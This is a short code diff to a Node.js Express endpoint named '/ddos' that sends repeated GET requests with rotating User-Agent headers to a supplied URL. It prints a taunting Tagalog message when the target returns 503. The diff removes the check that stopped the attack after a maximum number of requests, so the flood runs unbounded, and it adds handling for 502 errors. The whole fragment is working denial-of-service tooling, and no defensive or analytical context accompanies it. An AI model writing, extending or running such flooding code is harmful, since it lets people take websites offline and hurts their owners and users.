@@ -30,25 +30,24 @@ app.get('/ddos', async (req, res) => {
 
     const attack = () => {
         try {
-            if (requestCount >= maxRequests) {
-                console.log('Max requests reached.');
-                return;
-            }
-
             const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
             const headers = { 'User-Agent': userAgent };
 
             axios.get(url, { headers })
                 .then((response) => {
                     if (response.status === 503) {
-                        console.log("BOOM BAGSAK ANG GAGO HAHAHA ðŸ¤£ðŸ¤£");
+                        console.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
                     } else {
                         console.log(`Status Code: ${response.status}`);
                     }
                     requestCount++;
                 })
                 .catch((error) => {
-                    console.log("Error: " + error.message);
+                    if (error.response && error.response.status === 502) {
+                        console.log("Error: Request failed with status code 502");
+                    } else {
+                        console.log("Error: " + error.message);
+                    }
                 });
 
             if (requestCount < maxRequests) {
